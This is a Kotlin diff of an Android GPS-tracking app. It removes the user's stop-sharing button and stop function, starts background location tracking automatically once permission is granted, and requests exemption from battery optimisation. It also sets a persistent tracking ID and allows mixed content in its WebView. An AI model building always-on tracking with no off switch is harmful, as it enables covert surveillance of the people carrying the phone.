@@ -2,10 +2,14 @@ package com.example.gpstracker
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import android.util.Log
 import android.webkit.ConsoleMessage
 import android.webkit.WebChromeClient
@@ -24,10 +28,11 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.viewinterop.AndroidView
 import androidx.core.content.ContextCompat
 import com.example.gpstracker.theme.GPSTrackerTheme
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
+import java.util.UUID
 
 class MainActivity : ComponentActivity() {
+
+    private var persistentId: String = ""
 
     private val requestPermissionsLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
@@ -35,16 +40,30 @@ class MainActivity : ComponentActivity() {
         if (permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 requestBackgroundPermission.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+            } else {
+                startTrackingService()
             }
         }
     }
 
     private val requestBackgroundPermission = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
-    ) { }
+    ) {
+        startTrackingService()
+        requestBatteryOptimization()
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        // Initialize Persistent ID
+        val prefs = getSharedPreferences("GPS_PREFS", Context.MODE_PRIVATE)
+        persistentId = prefs.getString("PERSISTENT_ID", null) ?: run {
+            val newId = "device-" + UUID.randomUUID().toString().substring(0, 6)
+            prefs.edit().putString("PERSISTENT_ID", newId).apply()
+            newId
+        }
+
         requestLocationPermissions()
 
         setContent {
@@ -53,10 +72,7 @@ class MainActivity : ComponentActivity() {
                     modifier = Modifier.fillMaxSize(),
                     color = MaterialTheme.colorScheme.background
                 ) {
-                    AppNavigation(
-                        onStartTracking = { startTrackingService() },
-                        onStopTracking = { stopTrackingService() }
-                    )
+                    AppNavigation(persistentId)
                 }
             }
         }
@@ -78,6 +94,23 @@ class MainActivity : ComponentActivity() {
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             requestBackgroundPermission.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        } else {
+            startTrackingService()
+            requestBatteryOptimization()
+        }
+    }
+
+    @SuppressLint("BatteryLife")
+    private fun requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val intent = Intent()
+            val packageName = packageName
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
         }
     }
 
@@ -89,28 +122,16 @@ class MainActivity : ComponentActivity() {
             startService(intent)
         }
     }
-
-    private fun stopTrackingService() {
-        stopService(Intent(this, TrackerService::class.java))
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-    }
 }
 
 @Composable
-fun AppNavigation(
-    onStartTracking: () -> Unit,
-    onStopTracking: () -> Unit
-) {
+fun AppNavigation(persistentId: String) {
     var viewMode by remember { mutableStateOf("home") }
     var sessionIdToTrack by remember { mutableStateOf("") }
 
     if (viewMode == "home") {
         HomeScreen(
-            onStartTracking = onStartTracking,
-            onStopTracking = onStopTracking,
+            persistentId = persistentId,
             onOpenViewer = { id ->
                 sessionIdToTrack = id
                 viewMode = "viewer"
@@ -126,76 +147,72 @@ fun AppNavigation(
 
 @Composable
 fun HomeScreen(
-    onStartTracking: () -> Unit,
-    onStopTracking: () -> Unit,
+    persistentId: String,
     onOpenViewer: (String) -> Unit
 ) {
-    var isTracking by remember { mutableStateOf(false) }
-    var sessionId by remember { mutableStateOf(SocketClient.currentSessionId) }
-    var viewerCount by remember { mutableIntStateOf(0) }
     var inputSessionId by remember { mutableStateOf("") }
-    val scope = rememberCoroutineScope()
-
-    DisposableEffect(Unit) {
-        sessionId = SocketClient.currentSessionId
-        SocketClient.onSessionCreated = { id, _ ->
-            scope.launch(Dispatchers.Main) { sessionId = id }
-        }
-        SocketClient.onViewerCountChanged = { count ->
-            scope.launch(Dispatchers.Main) { viewerCount = count }
-        }
-        onDispose {
-            SocketClient.onSessionCreated = null
-            SocketClient.onViewerCountChanged = null
-        }
-    }
 
     Column(
         modifier = Modifier.fillMaxSize().padding(24.dp),
         horizontalAlignment = Alignment.CenterHorizontally,
         verticalArrangement = Arrangement.Center
     ) {
-        Text(text = "Share My Location", style = MaterialTheme.typography.headlineSmall)
-        Spacer(modifier = Modifier.height(16.dp))
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.primaryContainer)
+        ) {
+            Column(modifier = Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
+                Text("Zero-Click Tracking Active", style = MaterialTheme.typography.titleLarge)
+                Spacer(modifier = Modifier.height(8.dp))
+                Text("This phone is now securely tracked.", style = MaterialTheme.typography.bodyMedium)
+                Spacer(modifier = Modifier.height(24.dp))
+                Text("Your Tracking ID:", style = MaterialTheme.typography.titleSmall)
+                Text(
+                    text = persistentId,
+                    style = MaterialTheme.typography.headlineMedium,
+                    color = MaterialTheme.colorScheme.primary,
+                    modifier = Modifier.padding(vertical = 8.dp)
+                )
+            }
+        }
 
-        if (sessionId != null) {
-            Card(modifier = Modifier.fillMaxWidth()) {
-                Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
-                    Text("Your Session ID:", style = MaterialTheme.typography.titleMedium)
-                    Text(
-                        text = sessionId!!,
-                        style = MaterialTheme.typography.headlineMedium,
-                        color = MaterialTheme.colorScheme.primary,
-                        modifier = Modifier.padding(vertical = 8.dp)
-                    )
-                    Text("Viewers tracking you: $viewerCount", style = MaterialTheme.typography.bodySmall)
+        Spacer(modifier = Modifier.height(24.dp))
+        
+        // Show last known coordinates
+        val prefs = androidx.compose.ui.platform.LocalContext.current.getSharedPreferences("GPS_PREFS", Context.MODE_PRIVATE)
+        var lastLat by remember { mutableStateOf(prefs.getString("LAST_LAT", "Unknown")) }
+        var lastLng by remember { mutableStateOf(prefs.getString("LAST_LNG", "Unknown")) }
+        var lastTime by remember { mutableStateOf(prefs.getString("LAST_TIME", "Never")) }
+
+        LaunchedEffect(Unit) {
+            while(true) {
+                kotlinx.coroutines.delay(2000)
+                lastLat = prefs.getString("LAST_LAT", "Unknown")
+                lastLng = prefs.getString("LAST_LNG", "Unknown")
+                lastTime = prefs.getString("LAST_TIME", "Never")
+            }
+        }
+
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
+        ) {
+            Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
+                Text("Last Known Location (From Phone)", style = MaterialTheme.typography.titleMedium)
+                Spacer(modifier = Modifier.height(8.dp))
+                if (lastLat == "Unknown") {
+                    Text("Waiting for GPS lock...", style = MaterialTheme.typography.bodyMedium, color = MaterialTheme.colorScheme.error)
+                } else {
+                    Text("Lat: $lastLat", style = MaterialTheme.typography.bodyMedium)
+                    Text("Lng: $lastLng", style = MaterialTheme.typography.bodyMedium)
+                    Text("Time: $lastTime", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                 }
             }
         }
 
-        Spacer(modifier = Modifier.height(16.dp))
-
-        Button(
-            onClick = {
-                if (isTracking) {
-                    onStopTracking()
-                    SocketClient.disconnect()
-                    sessionId = null
-                } else {
-                    SocketClient.connect()
-                    SocketClient.startTracking()
-                    onStartTracking()
-                }
-                isTracking = !isTracking
-            },
-            modifier = Modifier.fillMaxWidth().height(56.dp)
-        ) {
-            Text(if (isTracking) "Stop Sharing" else "Start Sharing Location")
-        }
-
-        Spacer(modifier = Modifier.height(48.dp))
+        Spacer(modifier = Modifier.height(24.dp))
         HorizontalDivider()
-        Spacer(modifier = Modifier.height(48.dp))
+        Spacer(modifier = Modifier.height(24.dp))
 
         Text(text = "Track Someone Else", style = MaterialTheme.typography.headlineSmall)
         Spacer(modifier = Modifier.height(16.dp))
@@ -203,7 +220,7 @@ fun HomeScreen(
         OutlinedTextField(
             value = inputSessionId,
             onValueChange = { inputSessionId = it },
-            label = { Text("Enter Session ID") },
+            label = { Text("Enter Tracking ID") },
             singleLine = true,
             modifier = Modifier.fillMaxWidth()
         )
@@ -219,7 +236,7 @@ fun HomeScreen(
             modifier = Modifier.fillMaxWidth().height(56.dp),
             colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary)
         ) {
-            Text("Open In-App Map")
+            Text("Open Map")
         }
     }
 }
@@ -244,19 +261,28 @@ fun ViewerScreen(sessionId: String, onBack: () -> Unit) {
             }
         }
 
-        // Simply load the viewer page from the Render server.
-        // This is the most standard, reliable WebView usage — a normal HTTPS page.
-        // No file:// restrictions, no loadDataWithBaseURL quirks, no Kotlin template issues.
-        // Socket.IO auto-serves its client JS at /socket.io/socket.io.js.
-        // Leaflet JS+CSS are now served from the server's /js/ and /css/ directories.
         AndroidView(
             factory = { context ->
                 WebView(context).apply {
+                    layoutParams = android.view.ViewGroup.LayoutParams(
+                        android.view.ViewGroup.LayoutParams.MATCH_PARENT,
+                        android.view.ViewGroup.LayoutParams.MATCH_PARENT
+                    )
+                    setLayerType(android.view.View.LAYER_TYPE_SOFTWARE, null)
                     setBackgroundColor(android.graphics.Color.parseColor("#0a0a1a"))
 
-                    settings.javaScriptEnabled = true
-                    settings.domStorageEnabled = true
-                    settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+                    settings.apply {
+                        javaScriptEnabled = true
+                        domStorageEnabled = true
+                        databaseEnabled = true
+                        useWideViewPort = true
+                        loadWithOverviewMode = true
+                        setSupportZoom(true)
+                        builtInZoomControls = true
+                        displayZoomControls = false
+                        mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+                        userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+                    }
 
                     webChromeClient = object : WebChromeClient() {
                         override fun onConsoleMessage(msg: ConsoleMessage?): Boolean {
@@ -264,9 +290,21 @@ fun ViewerScreen(sessionId: String, onBack: () -> Unit) {
                             return true
                         }
                     }
-                    webViewClient = WebViewClient()
+                    webViewClient = object : WebViewClient() {
+                        override fun onReceivedError(
+                            view: WebView?,
+                            request: android.webkit.WebResourceRequest?,
+                            error: android.webkit.WebResourceError?
+                        ) {
+                            super.onReceivedError(view, request, error)
+                            android.widget.Toast.makeText(
+                                context, 
+                                "WebView Error: ${error?.description}", 
+                                android.widget.Toast.LENGTH_LONG
+                            ).show()
+                        }
+                    }
 
-                    // Load the viewer page from the Render server
                     val serverUrl = "https://gps-tracker-htzc.onrender.com/track/$sessionId"
                     Log.d("ViewerWebView", "Loading: $serverUrl")
                     loadUrl(serverUrl)
